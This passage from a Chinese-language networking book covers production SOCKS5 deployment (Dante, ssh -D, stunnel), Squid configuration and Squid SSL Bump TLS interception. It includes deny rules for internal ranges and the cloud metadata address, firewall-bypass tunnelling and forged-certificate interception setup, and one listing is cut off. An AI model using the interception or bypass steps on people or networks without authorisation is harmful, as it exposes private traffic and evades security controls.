Chapter 17

SOCKS5 完整實戰
從 60 行 demo 到生產級部署

Ch.9 我們用 60 行 Python 寫了一個能跑的 SOCKS5 server。本章把它升級到能在生產環境承載真實流量 — 認證、access control、observability、HA 部署、與真實場景的陷阱。

Ch.9 §9.8 的 60 行 Python 實作是個美麗的協定教具，但離生產環境還隔著一條鴻溝。生產級 SOCKS5 server 必須處理：百萬連線並發、RFC 1929 用戶認證、access control、idle timeout、UDP ASSOCIATE、observability、與「客戶端千奇百怪的不合規行為」。本章不重寫一遍，而是直接介紹 2026 年的主流選擇 — Dante、3proxy、microsocks，並給出生產級部署的完整指引。

17.1 — 主流開源 SOCKS5 server 對比

產品定位優勢限制
Dante商業級全功能 SOCKS5支援 GSSAPI、UDP ASSOCIATE、RBAC；穩定運行 20+ 年設定複雜；C 程式碼龐大
3proxy多協定（SOCKS4/5/HTTP）輕量單一 binary；小於 200KB；支援 SOCKS5、HTTP、TCP/UDP port forward文件不完整；Windows 為主開發
microsocks極簡 SOCKS5~500 行 C；單一檔案；零配置即可用無認證 ACL；不適合對外服務
shoes多協定 Rust 實作Rust 安全 + 多協定整合（Ch.16 的 production 版）2024 年才開源；社群小

選型建議：

  • 個人臨時翻牆：直接用 ssh -D 1080 user@vps
  • 企業內部 SOCKS5 服務：Dante（穩定、認證齊全）
  • 嵌入容器或邊緣裝置：microsocks（輕量、零依賴）
  • 多協定混合部署：shoes 或 Xray（協定家族整合）

17.2 — Dante 完整部署

Dante 由挪威 Inferno Nettverk 開發，2003 年開源後成為 SOCKS5 領域的事實標準。它的設計哲學是「能配置就不寫死」 — 幾乎每個行為都有 config 控制。代價是 danted.conf 看起來像迷你的 firewall ruleset。

典型企業部署架構：員工裝置 → 內網 Dante server → 出站防火牆 → 網際網路。

Listing 17.1 · /etc/danted.conf 生產級範例# 監聽介面與 port
internal: eth0 port = 1080
external: eth1

# 認證方式
clientmethod: none                # 第一階段（連線本身）不需認證
socksmethod: username             # 第二階段要求 username/password

# 工作模式
user.privileged: root
user.unprivileged: nobody
user.libwrap: nobody

# Client 連線規則（誰能連到 Dante）
client pass {
    from: 10.0.0.0/8 port 1-65535 to: 0.0.0.0/0
    log: error connect disconnect
}

# SOCKS 規則（透過 Dante 後可以連到哪）
socks pass {
    from: 10.0.0.0/8 to: 0.0.0.0/0
    command: connect bind udpassociate
    log: error connect disconnect iooperation
    socksmethod: username
}

# 阻擋連到內網（防止透過此 SOCKS 跳板攻擊內部）
socks block {
    from: 0.0.0.0/0 to: 10.0.0.0/8
    log: connect error
}

# 阻擋連到 metadata service（雲端常見洩漏點）
socks block {
    from: 0.0.0.0/0 to: 169.254.169.254/32
    log: connect error
}

幾個關鍵實務細節：

  • 兩階段認證：Dante 把「誰能連我」（client 規則）與「能透過我做什麼」（socks 規則）分開。這比 RFC 1928 的單階段認證更精細。
  • Block 規則必寫：Internal 網段、metadata service（169.254.169.254）、loopback 等內部資源必須明確 block — 不然 attacker 會把你的 SOCKS5 當作 SSRF 跳板。
  • username 透過 PAM：實務上整合 PAM、LDAP、Kerberos；不要用本地 /etc/passwd。
  • 記錄足夠的 log：iooperation 會記錄每次 read/write 與 byte 數，對流量分析必要。

17.3 — ssh -D：工程師的瑞士刀

當你需要「臨時、一次性、無需設定」的 SOCKS5 server，沒有比 ssh -D 更快的方案：

最簡單的 SOCKS5 server$ ssh -D 1080 user@bastion.example.com

# 然後 client 端設定 SOCKS5 proxy = 127.0.0.1:1080
$ curl --socks5 127.0.0.1:1080 https://example.com

運作機制：OpenSSH client 在本地開一個 SOCKS5 listener，把所有進來的 SOCKS5 請求透過已建立的 SSH 通道送到 server 端，由 server 端解析目的地並建立連線。

進階用法：

# 背景執行，斷線自動重連（搭配 autossh）
$ autossh -f -N -D 1080 user@bastion

# 多級跳板（透過 hop1 到 hop2 再開 SOCKS5）
$ ssh -D 1080 -J user@hop1 user@hop2

# 指定 bind address（讓區域網路其他機器也能用）
$ ssh -D 0.0.0.0:1080 user@bastion

限制：

  • 只支援 TCP CONNECT（不支援 UDP ASSOCIATE 或 BIND）
  • 所有流量串列化於單條 SSH 連線，並發效能差於專屬 SOCKS5 server
  • 沒有 access control，誰能連到 127.0.0.1:1080 就能用

但對於工程師日常的調試、臨時翻牆、繞過企業防火牆連測試環境，這是最快的方案。Ch.26 會深入展開 SSH 的所有代理用法。

17.4 — SOCKS5 over TLS：補上明文密碼洞

Ch.9 §9.4 提過 RFC 1929 用戶名密碼明文傳輸的安全弱點。生產環境的標準解法是把 SOCKS5 包在 TLS 通道裡。

常見做法：

  1. stunnel 包裝：在 Dante 前面架 stunnel，client 連 TLS 後 stunnel 解密轉發 SOCKS5
  2. SSH 通道：本質就是 SSH 之上的 SOCKS5（ssh -D 自帶）
  3. 專屬實作：shoes、Xray 等支援 SOCKS5 over TLS 原生

stunnel 配置範例：

/etc/stunnel/socks5-tls.conf — Server 端[socks5-tls]
accept = 443
connect = 127.0.0.1:1080      # 內部 Dante
cert = /etc/stunnel/server.pem
key = /etc/stunnel/server.key
verify = 2                          # 要求 client cert
CAfile = /etc/stunnel/ca.pem
/etc/stunnel/socks5-tls.conf — Client 端[socks5-tls]
client = yes
accept = 127.0.0.1:1080       # 本地 SOCKS5 listener
connect = server.example.com:443
cert = /etc/stunnel/client.pem
key = /etc/stunnel/client.key
CAfile = /etc/stunnel/ca.pem
verifyChain = yes

把 SOCKS5 藏在 TLS port 443 還有額外好處 — 看起來像普通 HTTPS 流量，難以被 DPI 識別。但這只是基本混淆，現代 DPI（特別是抗審查國家）會用 JA3/JA4 指紋與行為分析識別 — 這是 Ch.22 翻牆協定家族要解決的問題。

17.5 — 部署陷阱與常見問題

SOCKS5 部署中工程師最常踩的雷：

陷阱一：DNS leak

cf. Ch.9 §9.7 的 socks5 vs socks5h。如果 client 用 socks5:// 而非 socks5h://，DNS 解析在本地進行，目的域名洩漏給本地 DNS。Firefox 的 network.proxy.socks_remote_dns 必設 true。

陷阱二：UDP ASSOCIATE 失敗

多數 NAT 環境下 UDP ASSOCIATE 會失敗 — 因為 SOCKS5 server 回覆的 BND.ADDR/BND.PORT 是內網位址，client 無法連到。Dante 的 extension: bind 與 compatibility: sameport 等選項可以微調，但通常更乾淨的解法是「不要透過 SOCKS5 代理 UDP，DNS 用 DoH 直接走」。

陷阱三：half-close 處理

cf. Ch.5 §5.5。當 client 送 FIN 但仍想接收資料時，SOCKS5 server 必須正確支援 half-close。許多簡單實作（包括 Ch.9 §9.8 的 demo）會在收到 FIN 後立即關閉雙向連線，導致 HTTP/1.1 keep-alive 等場景失敗。生產實作必須用 shutdown(SHUT_WR) 而非 close()。

陷阱四：file descriptor 不足

每個 SOCKS5 連線消耗 2 個 fd（client + target）。Linux 預設 1024 fd 上限會在 500 連線時爆。生產部署必設 ulimit -n 1048576 或 systemd 的 LimitNOFILE=1048576。

陷阱五：把 SOCKS5 server 暴露公網

未認證的 SOCKS5 暴露公網是嚴重的安全問題 — Shodan 上有大量這類「open SOCKS5 server」，被掃描器找到後立刻成為垃圾郵件、爬蟲、攻擊跳板的工具。絕對不要把 SOCKS5 直接暴露在公網。要對外服務必須：(1) 強認證、(2) IP 白名單、(3) 包在 TLS 通道內、(4) 監控異常流量。

17.6 — Observability：知道 SOCKS5 在做什麼

SOCKS5 server 的 observability 三要素：

  • Connection log：每條連線的 timestamp、user、source IP、target host:port、bytes in/out、duration
  • Active session metric：當前同時連線數、各 user 的連線數、target host top 10
  • Error log：連線失敗、認證失敗、policy 拒絕

Dante 透過 log: 指令控制 log 詳細程度。實務上常做的是把 Dante log 透過 syslog 送到 ELK / Loki，搭配 Grafana 儀表板：

範例：將 Dante log 送 syslog# /etc/danted.conf
logoutput: /var/log/danted.log syslog stdout

# /etc/rsyslog.d/danted.conf
:programname, isequal, "danted" /var/log/danted.log
& stop

進階用法：用 eBPF 直接監視 socket 系統呼叫，獲得比應用層 log 更精確的資料（連 SOCKS5 protocol error 也能抓）。Cilium、bcc、bpftrace 都是工具。

17.7 — HA 部署：讓 SOCKS5 不單點失效

SOCKS5 server 是 stateful 服務（連線狀態存在記憶體），HA 比 stateless 的 web server 困難。常見方案：

  • Active-Passive + VRRP：keepalived 控制 VIP；對既有連線中斷，新連線無縫
  • L4 LB 前置：HAProxy / AWS NLB / GCP TCP LB 做 round-robin；必須 sticky session（依 source IP hash）讓同一 client 一直連到同一 SOCKS5 server
  • DNS round-robin：簡單但 client 不會自動重試；不推薦
  • 多獨立 server + client 端輪替：把 server 1 / 2 / 3 都告訴 client，client 自己選；最有彈性也最複雜

注意：SOCKS5 的「連線級別」狀態與 HTTP 不同 — TCP 中斷意味著應用層必須完整重連，不能像 HTTP keep-alive 那樣 transparent。所以 SOCKS5 HA 主要保護「新連線」的可用性，不是既有連線。

17.8 — 真實案例：Tor 為何用 SOCKS5

Tor Browser 與 Tor 網路之間的介面就是 SOCKS5。Tor daemon 在本機開 9050/tcp（SOCKS5）、9051/tcp（control port）。Tor Browser 內部所有流量都先走 SOCKS5 進入 Tor 網路。

選擇 SOCKS5 的原因：

  • 協定無關：Tor 不關心你跑 HTTP 還是 IRC，純通道思維
  • 不改變指紋：Browser 的 TLS / HTTP/2 指紋完整保留（Tor Browser 用 Firefox 修改版確保指紋一致性）
  • 客戶端容易整合：所有現代程式都能設 SOCKS5 環境變數

這是 SOCKS5 「簡單到無可取代」的最佳印證。Ch.24 會展開 Tor 的完整架構。

本章要點

生產級 SOCKS5：選 Dante（功能齊全）或 microsocks（輕量）；個人臨時用 ssh -D。必設陷阱：DNS leak（用 socks5h）、metadata service block、ulimit 提升、half-close 處理、強認證 + TLS 包裝。SOCKS5 在 2026 年仍是 Tor、抗審查工具家族（Shadowsocks/V2Ray/Trojan/Reality）的底層介面 — 它的「簡單」就是它的韌性。

Chapter 18

Squid 從入門到精通
三十年仍活躍的 web 代理之王

Squid 是 Forward Proxy 領域服役最久的開源產品，1996 年從 Harvest Cache 計畫分支以來持續演進。本章帶你走過 Squid 7.2（2025/10）的完整功能光譜，並誠實面對它在 HTTP/3 時代的尷尬處境。

Squid 1996 年首版發布至今三十年，從未停止演進。2025 年 10 月發布的 7.2 版仍在active maintenance，每年 7 月推出 stable major 版本是它的傳統。但 Squid 在 2026 年面臨身份危機 — 它至今仍未支援 HTTP/2，維護者甚至宣布跳過 HTTP/2 直接做 HTTP/3。這個事實對選型有決定性影響：Squid 在「企業 Forward Proxy 做 HTTPS 內容過濾」的傳統角色仍是王者，但對「現代 web 流量」的支援有重大限制。本章誠實面對這個雙面性。

18.1 — Squid 在 2026 年的位置

先看 Squid 仍然強的領域：

  • 企業 Forward Proxy：URL 過濾、員工上網稽核、頻寬節省、HTTPS 解密（SSL Bump）
  • ISP 透明 cache：在大型 ISP 與校園網路節省頻寬（雖然 HTTPS 普及後效益已大減）
  • 反向代理 / Web Accelerator：對舊 web 應用加速（雖然 Nginx / Varnish 在新部署勝出）
  • 豐富的 helper 生態：authenticator、url_rewriter、external_acl、ICAP 整合

再看 Squid 的限制：

  • 無 HTTP/2 支援：Squid 至 7.2 仍只支援 HTTP/1.0/1.1，HTTP/2 在 client 端只能被 detect 並拒絕。維護者宣布優先做 HTTP/31。
  • 無 HTTP/3 / QUIC 支援：仍在 PR review 中，2026 年尚未 release
  • SSL Bump 與 mobile app certificate pinning 衝突：cf. Ch.11 §11.8
  • 運維複雜度：squid.conf 是 Squid 自己的迷你 DSL，學習曲線陡

18.2 — 7.0 版的清理：移除大量舊功能

2025 年 2 月發布的 Squid 7.0.1 是大規模清理的一版，這也標誌著 Squid 正在「現代化」。被移除的功能：

移除的功能原因
ESI（Edge Side Includes）1990s 末的 server-side include 標準，已無人使用
Ident protocolRFC 1413，舊式 user identification，現代環境零信任
cache_object:// scheme遺留的 cache manager 介面，改用 http://
cachemgr.cgi遺留管理工具
squidclient 工具用 curl 取代
UFS/AUFS/DiskD purge 工具已內建到主程式
classful networks codeRFC 1518 已將 classful 棄用 30 年

清理的訊號：Squid 維護者正在「刪掉沒人用的累贅，集中能量在仍有價值的功能」。這是好事 — 一個 30 年老專案能有勇氣移除舊功能比加新功能更難。

18.3 — 安裝與基本架構

2026 年安裝 Squid 的標準方式：

Debian/Ubuntu$ apt install squid                # 通常為 6.x 系列

# 想要 7.x 需從 source 編譯，或用 PPA
$ apt install squid-deb-proxy
$ wget http://www.squid-cache.org/Versions/v7/squid-7.2.tar.gz
$ tar xzf squid-7.2.tar.gz && cd squid-7.2
$ ./configure --prefix=/usr/local/squid \
    --enable-ssl-crtd \
    --with-openssl
$ make && sudo make install

Squid 的 process 模型：

  • Coordinator process：監聽 port、accept 連線、分派
  • Worker processes：處理請求（多 core 並行）
  • Helper processes：認證、URL 重寫、external ACL
  • Disk-related processes：cache_dir 的 IO（diskd 模式）

設定多 worker：

# /etc/squid/squid.conf
workers 4          # 通常 = CPU cores
http_port 3128    # 預設 port

18.4 — squid.conf 核心指令

Squid 配置以「指令-參數」結構為主。最重要的核心指令：

基本 squid.conf# === 監聽 port ===
http_port 3128
http_port 3129 intercept              # 透明代理（透過 iptables REDIRECT）
https_port 3130 cert=/etc/squid/cert.pem  # Forward HTTPS proxy

# === ACL 定義 ===
acl localnet src 10.0.0.0/8
acl localnet src 172.16.0.0/12
acl localnet src 192.168.0.0/16
acl SSL_ports port 443
acl Safe_ports port 80 21 443 70 210 1025-65535
acl CONNECT method CONNECT
acl bad_sites dstdomain "/etc/squid/blocklist.txt"

# === Access control 規則（順序重要！）===
http_access deny bad_sites
http_access deny !Safe_ports
http_access deny CONNECT !SSL_ports
http_access allow localnet
http_access allow localhost
http_access deny all

# === Cache ===
cache_dir aufs /var/spool/squid 10000 16 256
#                          ^^^^  ^^  ^^^
#                          MB  L1  L2 (subdirectories)

# === Refresh policy ===
refresh_pattern ^ftp:           1440    20%     10080
refresh_pattern -i \.(gif|png|jpg|jpeg|css|js)$  10080  90%  43200
refresh_pattern .               0       20%     4320

# === Log ===
access_log daemon:/var/log/squid/access.log squid
cache_log /var/log/squid/cache.log

# === DNS ===
dns_nameservers 8.8.8.8 1.1.1.1

幾個核心觀念必須掌握：

ACL 系統的設計哲學

Squid 把所有「條件」都包裝成 ACL — IP 範圍、port、method、URL、time 等。然後 http_access 規則用 boolean 邏輯組合 ACL 做決策。這是 firewall ruleset 的設計風格。規則順序至關重要：第一個 match 的規則決定動作，後續規則不再評估。

Refresh pattern 的快取啟發式

refresh_pattern 三個參數：min（最少快取多久）、percent（按 Last-Modified 比例算的 freshness factor，cf. Ch.8 §8.2 的 LM factor）、max（最多快取多久）。這個演算法源自 1994 年 CERN httpd，至今仍在 Squid 中存活，是 web 史的活化石。

Cache_dir 的多種儲存後端

  • ufs：基本檔案系統，每個 object 一個檔案。簡單但 IO 差
  • aufs：UFS + 多執行緒 IO，是2026 年的推薦
  • diskd：用獨立 process 處理 IO，避免阻塞 main process
  • rock：Squid 自己的 storage engine，所有 object 在一個大檔案，性能最好

18.5 — Helper Protocol：Squid 的擴展性

Squid 的最強之處不在內建功能，而在 helper protocol — 透過 stdin/stdout 與外部 process 通訊，把認證、URL 重寫、ACL 決策等委由外部程式。

Helper 種類：

Helper 類型用途典型實作
auth_param使用者認證basic_ldap_auth、negotiate_kerberos_auth、ntlm_auth
url_rewrite_program動態 URL 改寫SquidGuard、自寫 Python script
external_acl_type動態 ACL 決策查 LDAP group、AD security group
store_id_programcache key 改寫把 youtube.com 不同 query string 但同一影片 cache 為同一 key

Helper 通訊協定極為簡單 — 一行 query，一行 response：

Listing 18.1 · 自寫 url_rewriter helper（Python）#!/usr/bin/env python3
# 把所有 .com 域名重寫到 archive.org
import sys

while True:
    line = sys.stdin.readline()
    if not line:
        break
    # Squid 送來: "channel-id URL ip/host method"
    parts = line.strip().split()
    channel_id = parts[0]
    url = parts[1]
    if ".com/" in url:
        new_url = "https://web.archive.org/web/" + url
        sys.stdout.write(f"{channel_id} OK rewrite-url={new_url}\n")
    else:
        sys.stdout.write(f"{channel_id} ERR\n")
    sys.stdout.flush()
squid.conf 中註冊url_rewrite_program /usr/local/bin/my_rewriter.py
url_rewrite_children 5 startup=2 idle=1 concurrency=0

Helper protocol 是 Squid 能整合到企業環境的關鍵 — 你能用任何語言寫，整合任何外部系統（LDAP、AD、SAML、商業 URL filtering DB）。這個架構從 1990s 沿用至今，仍是優秀的設計。

18.6 — 認證整合：Kerberos、LDAP、Negotiate

企業環境的標準是 Kerberos / Negotiate（GSSAPI）— 員工已登入 AD 域，Squid 透過 SPNEGO 自動取得身分，無需另外輸入密碼。

Listing 18.2 · Squid + Kerberos 整合# 1. 從 AD 拿 keytab
# （AD admin 端執行）
$ ktpass /princ HTTP/squid.example.com@EXAMPLE.COM \
    /mapuser squid_svc /pass **** \
    /out squid.keytab /crypto AES256-SHA1 /ptype KRB5_NT_PRINCIPAL

# 2. 把 keytab 放到 Squid server
$ cp squid.keytab /etc/squid/
$ chown proxy:proxy /etc/squid/squid.keytab
$ chmod 400 /etc/squid/squid.keytab

# 3. squid.conf
auth_param negotiate program /usr/lib/squid/negotiate_kerberos_auth \
    -k /etc/squid/squid.keytab -s HTTP/squid.example.com@EXAMPLE.COM
auth_param negotiate children 10 startup=0 idle=1
auth_param negotiate keep_alive on

# 整合 LDAP group 做進一步授權
external_acl_type ad_group ttl=300 %LOGIN \
    /usr/lib/squid/ext_ldap_group_acl \
    -R -b "dc=example,dc=com" -f "(&(memberOf=cn=%g,...)(sAMAccountName=%u))" \
    -D bind_user@EXAMPLE.COM -W /etc/squid/bind_pw -h ad.example.com

acl auth_users proxy_auth REQUIRED
acl finance_dept external ad_group "Finance"

http_access allow auth_users finance_dept

這個配置實作了「員工自動登入（Kerberos）+ 部門級授權（LDAP group）」的常見企業需求，無需員工輸入任何密碼。Negotiate 是 2026 年企業 Squid 部署的事實標準認證機制。

18.7 — 透明代理（Intercept Mode）

透明代理讓 client 在不設定 proxy的情況下被強制走 Squid。技術上透過 iptables REDIRECT 把流量重導：

Linux 透明代理基本設定# Squid 設定

透明代理的合規與法律問題見 Ch.7 §7.4。技術上的限制：

  • HTTPS 流量沒做 SSL Bump 就只能 splice（純通道，看不到內容）
  • HTTP/2 / HTTP/3 流量 Squid 仍不支援，會直接拒絕
  • Mobile app 的 certificate pinning 在透明 + Bump 環境下完全壞掉

Chapter 19

Squid 進階：SSL Bump 完整流程

SSL Bump 是 Squid 最具爭議也最強大的功能 — 把 HTTPS 從黑盒子變成可稽核的內容。Ch.7 §7.4 從法律角度討論過邊界；Ch.11 §11.8 概述了技術機制；本章展開實際部署的四種模式與完整 squid.conf。

SSL Bump 在 2026 年的 Forward Proxy 領域處於一個尷尬位置 — 它是企業 DLP（資料外洩防護）、URL 過濾、惡意網站攔截的關鍵技術，但同時面對三股逆風：法律風險（Ch.7）、mobile app certificate pinning 普遍化（Ch.11）、以及 Encrypted Client Hello 與 HTTP/3 的技術衝擊（Ch.11 §11.6、Ch.12）。理解這個張力後再讀本章 — SSL Bump 仍是企業環境的合法工具，但必須謹慎部署。

19.1 — Squid SSL Bump 的四種模式回顧

Ch.11 §11.8 提過四種模式，這裡再次精準定義並補上 squid.conf 對應指令：

模式意義看得到squid.conf
Splice純轉送（不解密）只看五元組ssl_bump splice
Peek偷看 ClientHelloSNI、ALPN、JA3 指紋ssl_bump peek
Stare偷看 ServerHello真實憑證鏈、CN/SANssl_bump stare
Bump完整解密所有 HTTP 內容ssl_bump bump

實務上很少只用單一模式 — 而是組合成「peek-and-splice」或「peek-and-bump」策略：先 peek 看 SNI，根據 SNI 決定後續動作（敏感網站 splice、其他 bump）。

19.2 — 三步握手機制

Squid SSL Bump 的決策不是一次性的，而是在 TLS 握手過程中分三步進行（SslBump1/2/3 ACL hooks）：

Figure 19.1 · SSL Bump 三步握手
sequenceDiagram
    participant C as Client
    participant Q as Squid
    participant S as Server
    Note over C,Q: Step 1 — 收到 CONNECT
    C->>Q: CONNECT example.com:443
    Note over Q: ssl_bump_step1 ACL<br/>依 dst host 決策<br/>通常 → peek
    Note over C,Q: Step 2 — 收到 ClientHello
    C->>Q: TLS ClientHello (SNI)
    Note over Q: 從 SNI 取得真實域名<br/>ssl_bump_step2 ACL<br/>依 SNI 決定 splice / stare
    Q->>S: ClientHello（若 stare/bump 才送）
    S-->>Q: ServerHello + Cert
    Note over C,S: Step 3 — 看到憑證
    Note over Q: ssl_bump_step3 ACL<br/>依憑證 CN/SAN 最後決策<br/>bump 或 fallback splice
    Note over C,S: 後續依決策走 splice 或 bump 流程
圖 19.1　SSL Bump 三步握手。每一步都有對應的 ACL hook，讓你能基於越來越完整的資訊做決策。

這個設計的精妙之處：在 step 1 時你只知道 client 想連到誰（從 CONNECT host）；step 2 時你知道 client 真實要連的 SNI（可能與 CONNECT 不一致）；step 3 時你看到真實憑證，能驗證 SNI 與憑證 CN 是否一致。每一步都能改變決策。

19.3 — 完整 squid.conf：peek-and-splice

業界最廣泛採用的部署模式：對敏感網站 splice，其他全部 bump 解密做稽核。

Listing 19.1 · 生產級 SSL Bump 配置（peek-and-splice）# === 基本 port 設定 ===
http_port 3128
https_port 3129 intercept ssl-bump \
    cert=/etc/squid/ssl/squid-ca.pem \
    generate-host-certificates=on \
    dynamic_cert_mem_cache_size=16MB

# === SSL helper（ssl_crtd 動態簽發憑證）===
sslcrtd_program /usr/lib/squid/security_file_certgen \
    -s /var/lib/ssl_db -M 16MB
sslcrtd_children 10

# === 信任 CA store ===
tls_outgoing_options cafile=/etc/ssl/certs/ca-certificates.crt

# === 敏感網站不解密（bypass list）===
acl bank_sites ssl::server_name_regex ^.*\.(bankofamerica|chase|wells)\.com$
acl medical ssl::server_name_regex ^.*\.(kaiserpermanente|mayoclinic)\.org$
acl govern ssl::server_name_regex ^.*\.gov$
acl edu ssl::server_name_regex ^.*\.edu$
acl labor ssl::server_name "/etc/squid/labor-unions.txt"

acl bypass_decrypt any-of bank_sites medical govern edu labor

# === 三步 ACL hook ===
# Step 1: 對所有 CONNECT 都先 peek（看 SNI）
acl step1 at_step SslBump1
ssl_bump peek step1

# Step 2: 拿到 SNI 後決策 — 敏感網站 splice，其他 stare
acl step2 at_step SslBump2
ssl_bump splice step2 bypass_decrypt
ssl_bump stare step2

# Step 3: 預設行為 — bump 完整解密
ssl_bump bump

# === 解密後的 HTTP 內容稽核 ===
acl badware url_regex "/etc/squid/malware-urls.txt"
http_access deny badware

acl content_filter url_regex "/etc/squid/blocklist.txt"
http_access deny content_filter

# === Log 解密後的請求 ===
access_log daemon:/var/log/squid/access.log squid

這個配置的核心邏輯：

  1. 所有 HTTPS 流量在 step 1 都 peek（看 SNI 但不解密）
  2. Step 2 拿到 SNI，匹配 bypass_decrypt — 銀行、醫療、政府、教育、勞工網站 splice 不解密
  3. 其他流量 step 2 stare（看 server cert）
  4. Step 3 預設 bump 完整解密
  5. 解密後做 URL 過濾、惡意網站攔截、內容稽核
敏感網站 bypass list 不只是禮貌

cf. Ch.7 §7.4。攔截律師-客戶通訊、勞工-工會通訊、醫療資料在許多司法管轄區是獨立犯罪。這個 bypass list 是法律必要，不是禮貌。金融服務也應 bypass — 不只是合規問題，mobile banking app 的 certificate pinning 會在 SSL Bump 環境下完全無法使用。

19.4 — 動態憑證簽發機制

SSL Bump 的 bump 動作需要對每個目標域名動態簽發偽造憑證。Squid 的做法：

  1. Squid 內部的 ssl_crtd helper（security_file_certgen）在啟動時載入 Squid 的 CA private key
  2. 當需要為 example.com 簽憑證時，ssl_crtd 用 CA 簽一個 CN=example.com 的偽造憑證
  3. 偽造憑證 cache 在記憶體（dynamic_cert_mem_cache_size）與磁碟（ssl_db）
  4. 下次同一域名命中 cache 直接使用

建立 Squid CA 與 cache db：

Listing 19.2 · 建立 Squid SSL Bump 環境# 1. 產生 Squid 內部 CA（自簽根憑證）
$ openssl req -new -newkey rsa:2048 -days 3650 -nodes -x509 \
    -keyout squid-ca.key -out squid-ca.crt \
    -subj "/CN=Corporate Internal Proxy CA/O=Example Inc"

# 2. 合併成 PEM 給 Squid 用
$ cat squid-ca.crt squid-ca.key > squid-ca.pem
$ chmod 400 squid-ca.pem
$ chown proxy:proxy squid-ca.pem

# 3. 初始化 ssl_crtd 的 cache db
$ /usr/lib/squid/security_file_certgen -c \
    -s /var/lib/ssl_db -M 16MB
$ chown -R proxy:proxy /var/lib/ssl_db

# 4. 透過 GPO / MDM 把 squid-ca.crt 推送到員工裝置作為信任根
#    （這是 SSL Bump 合法部署的關鍵 — 員工裝置必須信任這個 CA）

第 4 步是 SSL Bump 合法性的關鍵 — 從 ISE 三條件（Ch.7 §7.4）的角度，使用者必須事先「明確同意」並安裝企業 CA。實作上透過 Group Policy（Windows）或 MDM（Mac/iOS/Android）統一推送。

CA 私鑰是冠上珠寶

Squid CA 的 private key 一旦外洩，攻擊者能對任何域名簽偽造憑證，員工裝置全部會無條件信任。這是 2012 Trustwave 事件（Ch.7 §7.4）的根源。最低限度防護：

• Private key 只放在 SSL Bump server 本機，絕不上 Git
• 定期輪替（每 1–2 年）
• 監控 CA 簽發紀錄（Squid cache.log 會記錄）
• 啟用 HSM（Hardware Security Module）儲存私鑰是最佳實踐

19.5 — ICAP 整合：把內容稽核外包

Squid 的 SSL Bump 解密後的 HTTP 內容如何做進階稽核？大量檔案掃毒、DLP 模式偵測、AI 內容分類等不適合在 Squid 內部做（會阻塞 worker process）。標準解法是 ICAP（Internet Content Adaptation Protocol，RFC 3507, 2003）：

Figure 19.2 · ICAP REQMOD / RESPMOD
sequenceDiagram
    participant C as Client
    participant Q as Squid
    participant I as ICAP Server
    participant O as Origin
    C->>Q: HTTP request
    Q->>I: ICAP REQMOD（請求 metadata + body）
    I-->>Q: modified or block
    Q->>O: HTTP request
    O-->>Q: HTTP response
    Q->>I: ICAP RESPMOD（回應 metadata + body）
    I-->>Q: modified
    Q-->>C: HTTP response
圖 19.2　ICAP 兩種模式：REQMOD（請求修改）與 RESPMOD（回應修改）。Squid 把流量送 ICAP server，後者做掃描或修改後送回。

ICAP server 主流選擇：

  • c-icap：開源 ICAP server framework
  • ClamAV + c-icap：開源防毒掃描
  • Symantec Content Analysis：商業 sandbox + AV
  • McAfee Web Gateway：商業 ICAP（也整合 SSL Bump）

squid.conf 整合 ICAP：

Listing 19.3 · Squid + ICAP 整合icap_enable on
icap_service service_req reqmod_precache icap://icap.example.com:1344/reqmod
icap_service service_resp respmod_precache icap://icap.example.com:1344/respmod

adaptation_access service_req allow all
adaptation_access service_resp allow all

icap_service_failure_limit 10
icap_persistent_connections on
icap_send_client_ip on
icap_send_client_username on

ICAP 的優勢是內容稽核變成可水平擴展的微服務 — Squid 處理 proxy 邏輯，ICAP server 集群處理 CPU 密集的內容掃描，兩者解耦。這是 90 年代設計、至今仍實用的架構。

19.6 — eCAP：嵌入式內容修改

ICAP 是網路協定（要送 HTTP 給 ICAP server），對於高 throughput 環境延遲過大。Squid 的另一機制 eCAP（embedded Content Adaptation Protocol）讓內容處理 module 直接編譯進 Squid process 內，零網路 hop。

eCAP 適合：

  • 簡單的 header 改寫
  • 內容壓縮（gzip 加密前的內容）
  • 輕量級內容過濾

eCAP 的代價：module 需要 C++ 寫並動態載入；崩潰會拖垮整個 Squid process。生產環境通常 ICAP（穩定性優先）+ eCAP（極致效能場景）並用。

19.7 — SSL Bump 的 2026 年困境

SSL Bump 在 2026 年面臨多股技術逆風：

逆風 1：Certificate Pinning 普及

Ch.11 §11.8 提過。2026 年 mobile banking、社群 app、Google 系列、許多 SaaS 客戶端都實作 cert pinning。SSL Bump 環境下這些 app 直接無法使用。員工會抱怨「公司 WiFi 上 Slack 進不去」。實務對策：把這類 app 的 endpoint（*.slack.com、*.googleapis.com、*.facebook.com 等）加入 bypass list。維護這個 bypass list 是運維日常工作。

逆風 2：HTTP/2 與 HTTP/3

cf. Ch.18 §18.1。Squid 至 7.2 仍不支援 HTTP/2，遇到 HTTP/2 的 ALPN 會拒絕。實務上 client 會 fallback HTTP/1.1，但這是 graceful degradation 而非 ideal。HTTP/3（QUIC over UDP）則完全繞過 Squid（UDP 不會被 iptables REDIRECT 攔截到 TCP-only 的 Squid）— 你必須在防火牆 block UDP/443 強迫客戶端 fallback。

逆風 3：ECH（Encrypted Client Hello）

cf. Ch.11 §11.6。一旦 ECH 普及，「peek 看 SNI」這個 SSL Bump 第一步基礎被打破 — 你只能看到外層的 ECH SNI（如 cloudflare-ech.com），看不到真實目標。peek-and-splice 策略徹底失效，只剩兩個選擇：(a) 全部 bump 解密（合規問題大），(b) 全部 splice 不解密（沒了內容稽核）。

逆風 4：SASE 雲端方案的競爭

cf. Ch.21。Zscaler、Netskope、Palo Alto Prisma Access 等 SASE 服務把 SSL Bump 移到雲端，並結合 endpoint agent 做 inspection — 不需要在企業內網架 Squid，且能跟著員工走（在家、出差都受保護）。2026 年的趨勢是企業逐步把傳統 on-prem Squid 替換成 SASE。

這四股逆風讓 SSL Bump 的新部署越來越少。但已部署的環境仍會持續運行多年 — 已在的 Squid 不會立刻換，遷移成本高。理解 SSL Bump 仍是企業網路工程師的必備技能，但別把它當作「未來」技術。

本章要點

Squid SSL Bump 透過三步握手 ACL hook（step 1 / step 2 / step 3）逐步取得資訊做決策。

  • peek-and-splice 是業界主流：敏感網站（金融、醫療、政府、教育、勞工）必 splice，其他 bump。動態憑證簽發靠 ssl_crtd，CA 私鑰是冠上珠寶必須嚴密保護。ICAP 把進階稽核外包成微服務；eCAP 嵌入式追求極致效能。
  • 2026 年四股逆風：cert pinning、HTTP/2/3、ECH、SASE 雲端方案。SSL Bump 仍實用，但已不是未來。

Chapter 20

PAC、WPAD 與 Active Directory 整合

